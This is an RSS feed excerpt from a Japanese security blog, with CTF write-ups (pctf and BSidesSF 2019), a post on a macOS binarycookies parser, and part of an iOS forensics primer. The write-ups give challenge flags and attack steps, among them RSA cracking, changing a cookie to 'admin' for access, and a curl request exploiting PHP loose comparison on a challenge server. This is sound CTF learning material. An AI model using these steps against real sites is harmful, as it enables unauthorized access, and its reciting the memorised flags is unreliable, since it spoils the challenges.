&lt;li&gt;&lt;code&gt;pctf{st3gs0lv3_1s_u53ful}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;cookie-monster&#34;&gt;Cookie Monster&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Cookieにflagというフィールドがあり、MD5が設定されている&lt;/li&gt;
&lt;li&gt;どこかのMD5クラックサイトで検索すると&lt;code&gt;pc&lt;/code&gt;がでてくる&lt;/li&gt;
&lt;li&gt;フラグフォーマットは、&lt;code&gt;pctf{&lt;/code&gt;なのでひたすらこのCookieのMD5の元を考えれば良いとわかる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;feed-me&#34;&gt;Feed_me&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;バイナリを読むと、渡された乱数3つがチェック用の値になっている&lt;/li&gt;
&lt;li&gt;入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数
&lt;code&gt;
x + y = a1
y + z = a2
x + z = a3
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;自分が解いたときのケース
&lt;code&gt;
Can you cook my favourite food using these ingredients :)
-10026 ; -8250 ; -12490 ;
-000007133-000002893-000005357
That&#39;s yummy.... Here is your gift:
pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}
&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;game-of-faces&#34;&gt;Game of Faces&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;ページにアクセスすると3色のよくわからん正方形があるが、ソースを見るとファイルアップロードが見える&lt;/li&gt;
&lt;li&gt;適当にファイルをアップロードするとh1タグでbase64エンコードされた文字列が帰ってくるのでデコードするとファイル名がわかる&lt;/li&gt;
&lt;li&gt;ファイル名で直接アクセスするとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{You_L00K_Wi3Rd_IN_H3R3}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;easy-rsa&#34;&gt;Easy RSA&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;e, c, nのパラメータが渡されるが、eが著しく大きいので、Wiener&amp;rsquo;s Attackだとわかる&lt;/li&gt;
&lt;li&gt;コード書いて、秘密鍵dを計算すると&lt;code&gt;12978409760901509356642421072925801006324287746872153539187221529835976408177&lt;/code&gt;だとわかる&lt;/li&gt;
&lt;li&gt;あとは普通にRSAを解読したら、出てきた数値を16進数表記にして1byteずつasciiにすればフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{Sup3r_st4nd4rd_W31n3r_4tt4ck}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;late-pr&#34;&gt;Late PR&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;課題を提出しようとしてたけどパソコンがクラッシュしたという問題文とともにイメージファイルが渡される&lt;/li&gt;
&lt;li&gt;vol.pyでプロセスを見るとchrome.exeがexitしていることがわかり、GoogleChromeCrashHandler.exeというプロセスの存在に気づくので、当該プロセスのメモリダンプを見てみるとフラグ

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vol.py -f *.raw --profile Win7SP1x86_23418 pslist&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vol.py -f *.raw --profile Win7SP1x86_23418 memdump --dump-dir .&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strings 468.dmp | grep pctf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{Late_submissions_can_be_good}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;mandatory-php&#34;&gt;Mandatory PHP&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;以下のPHPのコードが渡される&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;?php&lt;/span&gt; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;; 
highlight_file(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val1&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val2&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val3&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val4&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;/[^A-Za-z]/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;)) 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oh my gawd...&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;hash(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;sha256&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;(log10(&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;**&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0.5&lt;/span&gt;)))&lt;span style=&#34;color:#666&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;) 
&lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Bye...&amp;#34;&lt;/span&gt;); 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag1&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;10&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;++&lt;/span&gt;){ 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;)) 
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;duck&amp;#39;&lt;/span&gt;); 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
        &lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;); 
}     
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;WoAHh!&amp;#34;&lt;/span&gt;) 
&lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oops..&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag2&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;end...&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#bc7a00&#34;&gt;?&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;val1&lt;/code&gt;が&lt;code&gt;INF&lt;/code&gt;になるので、&lt;code&gt;val3&lt;/code&gt;と&lt;code&gt;val4&lt;/code&gt;でINFになるようにデカイ数を渡して、&lt;code&gt;val2&lt;/code&gt;は10回urldecodeして&lt;code&gt;WoAHh!&lt;/code&gt;になるようにパラメータを渡せば良い&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl &#39;http://159.89.166.12:14000///index.php?ffval1=0&amp;amp;val2=WoAHh%2525252525252525252521&amp;amp;val3=101&amp;amp;val4=大きい値&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{b3_c4r3fu1_w1th_pHp_f31145}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;終了後に解いた問題&#34;&gt;終了後に解いた問題&lt;/h2&gt;

&lt;h3 id=&#34;magic-pngs&#34;&gt;Magic PNGs&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;パスワード付きzipとpngファイルが渡されるが、&lt;code&gt;file&lt;/code&gt;コマンドを叩くと&lt;code&gt;data&lt;/code&gt;都市てか表示されないためヘッダーなどが間違っていると推測できる&lt;/li&gt;
&lt;li&gt;案の定Magic numberが間違っているので修正するが、それでも開かない&lt;/li&gt;
&lt;li&gt;PNGは通常IDATチャンクがあるはずだが、そのキーワードが&lt;code&gt;idat&lt;/code&gt;と小文字になっていたのでこれを修正すると開けて、&lt;code&gt;h4CK3RM4n&lt;/code&gt;が読み取れる&lt;/li&gt;
&lt;li&gt;ヒントから、この値をmd5してパスワードzipを展開するとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{y0u_s33_m33_n0w!}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ファイルヘッダーとかが違うところに気づいていなかった&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;exorcism&#34;&gt;EXORcism&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;大量の1と0があるファイルを渡される&lt;/li&gt;
&lt;li&gt;100x100の正方形に整形して、1をスペース、0は黒として描画するとQRコードになる&lt;/li&gt;
&lt;li&gt;QRコードを読み取ると、&lt;code&gt;160f15011d1b095339595138535f135613595e1a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;タイトルがXORなので、この文字列となにかをxorする必要があると推測できる&lt;/li&gt;
&lt;li&gt;フラグフォーマットの&lt;code&gt;pctf{&lt;/code&gt;になるようにxorする値を計算すると&lt;code&gt;flagf&lt;/code&gt;になるので、&lt;code&gt;flag&lt;/code&gt;を繰り返してxorすれば良いとわかるので、それで計算するとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{wh4_50_53r1u5?}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;そもそもQRコードになるなんて想像ができなかった&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;save-earth&#34;&gt;Save Earth&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;USBパケットのデータが渡されて入力した値を求めさせる&lt;/li&gt;
&lt;li&gt;データ内にasciiがないので、間隔つまりモールス信号だと推測する&lt;/li&gt;
&lt;li&gt;USBパケットの末尾のデータ部から4をスペース、1と2をそれぞれモールス信号にするとフラグが得られる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CTFS4V3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>BesidesCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/bsidessf2019/</link>
      <pubDate>Sun, 10 Mar 2019 22:43:52 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/bsidessf2019/</guid>
      <description>

&lt;h2 id=&#34;blink&#34;&gt;blink&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;apkが渡されるのでunzipして、&lt;code&gt;classes.dex&lt;/code&gt;をdex2jarでjarファイルに変換&lt;/li&gt;
&lt;li&gt;jarファイルをunzipして、classファイルをjadで一括逆コンパイル&lt;/li&gt;
&lt;li&gt;適当にファイルを眺めていると&lt;code&gt;/com/example/blink/r2d2.jad&lt;/code&gt;にbase64でエンコードされた文字列があるのでデコード&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CTF{PUCKMAN}&lt;/code&gt;と書かれた画像が出てくる&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;zippy&#34;&gt;zippy&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;pcapngが渡されるのでFollo TCP Streamをすると&lt;code&gt;supercomplexpassword&lt;/code&gt;がzipのパスワードだとわかる&lt;/li&gt;
&lt;li&gt;パケットからzipファイルを通信してるパケットを見つけて抽出&lt;/li&gt;
&lt;li&gt;パスワードを使ってunzipすると中のflag.txtに&lt;code&gt;CTF{this_flag_is_your_flag}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;futurella&#34;&gt;futurella&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;HTMLのソースを見ると&lt;code&gt;CTF{bring_it_back}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;kookie&#34;&gt;kookie&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cookie/monster&lt;/code&gt;でログインできるのでログインする&lt;/li&gt;
&lt;li&gt;その際のCookieを見ると、&lt;code&gt;cookie&lt;/code&gt;になっているので、これを&lt;code&gt;admin&lt;/code&gt;に変更&lt;/li&gt;
&lt;li&gt;その後reloadすると&lt;code&gt;CTF{kookie_cookies}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>binarycookiesファイル解析ツールbincookie</title>
      <link>https://owlinux1000.github.io/blog/post/analyzing_binary_cookie/</link>
      <pubDate>Wed, 06 Mar 2019 23:10:49 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/analyzing_binary_cookie/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;iOSやMacのフォレンジックでは、アーティファクトの1つとしてCookie情報を利用します。macOSでは、&lt;code&gt;/User/ユーザ名/Library/Cookies/Cookies.binarycookies&lt;/code&gt; に存在します。しかしながら、本ファイルは拡張子からもわかるようにバイナリ形式になっています。そこで、本記事ではこのバイナリファイルを解析するツールをご紹介します。&lt;/p&gt;

&lt;h2 id=&#34;bincookie&#34;&gt;bincookie&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/owlinux1000/bincookie&#34;&gt;bincookie&lt;/a&gt;&lt;br /&gt;
拙作のGolangで実装された解析ツールです。goユーザなら&lt;code&gt;go get&lt;/code&gt;で入りますし、Releaseからバイナリのダウンロードもできます。&lt;br /&gt;
本ツールの特徴として、&lt;code&gt;curl&lt;/code&gt;コマンドで利用できる形式として出力する点です。私の手元にあった&lt;code&gt;/Users/ユーザ名/Library/Cookies/com.apple.iTunes.binarycookies&lt;/code&gt;に対して適用した例が以下です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ bincookie /Users/ユーザ名/Library/Cookies/com.apple.iTunes.binarycookies
# Netscape HTTP Cookie File
# This file was generated by owlinux1000&amp;#39;s bincookie
# https://github.com/owlinux1000/bincookie

.apple.com	TRUE	/	TRUE	1566914111	xp_ci	hogehogehoge
.apple.com	TRUE	/	TRUE	1566914111	xp_ab	hogehogehoge
.xp.apple.com	TRUE	/	TRUE	1566914111	xp_aci	hogehogehog&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、同様のソフトウェアとして以下の2つが存在します。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/as0ler/BinaryCookieReader&#34;&gt;BinaryCookieReader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/horrorho/burnt-cookie&#34;&gt;Burnt Cookie&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;binarycookiesファイル解析ツールbincookieの宣伝をしました。binarycookiesファイルを解析する際には、ぜひbincookie使ってみてください。バグか何かあったらissueやPR待ってます。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>iOSデバイスフォレンジック入門</title>
      <link>https://owlinux1000.github.io/blog/post/an_introduction_of_ios_forensics/</link>
      <pubDate>Thu, 28 Feb 2019 21:00:00 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/an_introduction_of_ios_forensics/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;本記事では、&lt;strong&gt;iOSフォレンジックをやったことない&lt;/strong&gt;人向けに基本的な情報をまとめてみました。取っ掛かりとしては簡単に読める内容だと思います。主にiOSデバイスのバックアップデータやその解析ツールについてご紹介しています。&lt;/p&gt;

&lt;h2 id=&#34;準備&#34;&gt;準備&lt;/h2&gt;

&lt;p&gt;本記事では主に以下のデバイスやソフトウェアを使って検証しています。当該デバイスやバージョンでない場合同じ結果や解釈にならない可能性もありますのでご了承ください。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;iPad mini4 (iOS 12.1.1 非Jailbreak)&lt;/li&gt;
&lt;li&gt;MacBookPro (High Sierra 10.13.6)&lt;/li&gt;
&lt;li&gt;iTunes (12.8.3)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;ios-概要&#34;&gt;iOS 概要&lt;/h2&gt;

&lt;p&gt;iOSは、iPhoneやiPad、Apple Watch等で利用されているOSです。iOSは大きく分けて、以下の4つのシステムから構成されています。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Cocoa Touch&lt;/li&gt;
&lt;li&gt;Media&lt;/li&gt;
&lt;li&gt;Cocoa Service&lt;/li&gt;
&lt;li&gt;Core OS&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Cocoa Touchは、名前からもわかるようにタッチ操作を始めとするユーザーインタフェースのシステムです。Mediaは、動画像や音楽などMedia用のシステムです。Cocoa Serviceは、アプリケーションにとって必要な基本的なシステムを提供しています。最後のCore OSは、ハードウェアに近いより低レイヤーなネットワークやメモリ管理、スレッドの機能などを提供しています。&lt;/p&gt;

&lt;p&gt;次に、iOSで用いられているファイルシステムについて簡単にご紹介いたします。近年のiOSではAPFS（Apple File System）と呼ばれるファイルシステムが利用されています。従来はHFS、HFS+が使われていましたが、2017年のiOS 10.3からAPFSが導入されました。APFSの特徴としては、inodeが64bitに拡張されたためより多くのファイルが扱えるようになったり、CoW（Copy on Write）のサポート、タイムスタンプがナノ秒単位まで記録するようになったりなど従来のファイルシステムに比べ大きく変わっています。より詳細な情報としては以下のWebページなどが参考になると思います。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ja.wikipedia.org/wiki/Apple_File_System&#34;&gt;Apple File System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cyberforensic.focus-s.com/knowledge/articles_detail/356/&#34;&gt;ファイルシステムがAPFSになった事による変更点&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;itunesバックアップ&#34;&gt;iTunesバックアップ&lt;/h2&gt;

&lt;p&gt;iOSデバイスにおけるデータを抽出する方法としては、物理と論理の2通りの方法があります。しかしながら、物理デバイスから情報を抽出するためには、機材が必要であったり、論理面でも有償のツールが必要なことが多く入門には不向きです。そこで本記事では、iTunesのバックアップデータを元にiOSデバイスのフォレンジック調査に役立つ情報をまとめていこうと思います。もしすでにホストマシンにiTunesを用いてバックアップをとっている人はそのデータをお使いできます。もしなければ、iOSデバイスを接続し、iTunesの画面よりバックアップをとってください。&lt;/p&gt;

&lt;p&gt;iOSデバイスのバックアップデータは、以下の場所に格納されます。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Mac：&lt;code&gt;/User/ユーザ名/Library/Application Support/MobileSync/Backup&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Windows：&lt;code&gt;\AppData\Roaming\Apple Computer\MobileSync\Backup\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Windowsストアアプリ経由でiTunesを入れた場合：&lt;code&gt;%USERPROFILE%\Apple\MobileSync\Backup&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;バックアップを行っている状態で、上記フォルダにアクセスするとハッシュ値が名前のフォルダがあると思います。それがバックアップデータの本体です。バックアップデータのフォルダの中には、主に以下のファイルやフォルダが格納されていると思います。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Manifest.plist&lt;/li&gt;
&lt;li&gt;Manifest.db&lt;/li&gt;
&lt;li&gt;Info.plist&lt;/li&gt;
&lt;li&gt;Status.plist&lt;/li&gt;
&lt;li&gt;大量のフォルダ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Manifest.plistは、主にバックアップの内容について記載されています。例えばバックアップした日時、バックアップを暗号化しているかどうか、インストールしたアプリケーション一覧などがあげられます。Manifest.dbは、SQLiteのデータベースファイルで、バックアップデータに含まれるファイルやフォルダの情報が格納してあります。&lt;code&gt;fileID&lt;/code&gt;カラムには、SHA1が格納されており、これはファイル名を表しています。そのため、バックアップフォルダの中で、このハッシュ値を使って検索したりします。&lt;br /&gt;
以下の図は、DB Browser for SQLiteでManifest.dbを読み込んだときの図です。CUIのsqlite3コマンドなどでも良いのですが、フォレンジック業務をやるときには、フィルターやソート、検索などが手軽に使えるほうが効率が良いので、こういったGUIツールを使っています。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/2PzjpVu&#34; alt=&#34;Manifest.db&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Info.plistは、主にバックアップ対象のデバイス情報について記載されています。例えば、IMEIやシリアルナンバー、最後にバックアップした日などが挙げられます。Status.plistは、主にバックアップ状況について記載されています。&lt;/p&gt;

&lt;p&gt;バックアップフォルダの中に格納されている主要なアーティファクトは、SANSの公開資料の&lt;a href=&#34;https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf&#34;&gt;DFIR-Smartphone-Forensics-Poster.pdf&lt;/a&gt; に掲載されています。とても便利なのでダウンロードしておくことをおすすめします。&lt;/p&gt;

&lt;h2 id=&#34;itunesバックアップ解析ツール&#34;&gt;iTunesバックアップ解析ツール&lt;/h2&gt;

&lt;p&gt;今まで見てきたバックアップデータなどを解析する際に役立つツールをご紹介します。&lt;/p&gt;

&lt;h3 id=&#34;plutil&#34;&gt;plutil&lt;/h3&gt;

&lt;p&gt;拡張子plistのバイナリファイルの中身を解析する際には、&lt;code&gt;plutil&lt;/code&gt;コマンドが便利です。Macの場合は標準でインストールされているのですぐに使えます。Windowsでは、&lt;a href=&#34;https://www.icopybot.com/plist-editor.htm&#34;&gt;plist Editor Pro for Windows&lt;/a&gt;というものが存在するので、それを利用できそうです（未検証）。&lt;/p&gt;

&lt;p&gt;本来&lt;code&gt;plutil&lt;/code&gt;コマンドはいろいろな操作ができますが、今回はフォレンジックでよく使うplistファイルを別のファイルに変換する操作をご紹介します。以下は、&lt;code&gt;Info.plist&lt;/code&gt;ファイルをxmlファイルに変換する場合の例です。plistファイルはバイナリファイルなので、こういった変換を行うことが必要となってきます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ plutil -t convert xml1 Info.plist -o Info.xml&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;-o&lt;/code&gt;オプションを忘れてしまうとplistファイル自体の中身が書き換わってしまうので注意してください。&lt;br /&gt;
その他Pythonが利用できる環境であれば、&lt;code&gt;plistlib&lt;/code&gt;ライブラリが利用できるので、これを用いてプログラマブルに解析することも可能です。&lt;/p&gt;

&lt;h3 id=&#34;iexplorer&#34;&gt;iExplorer&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/Aogfu9Z&#34; alt=&#34;iExplorer&#34; /&gt;&lt;/p&gt;

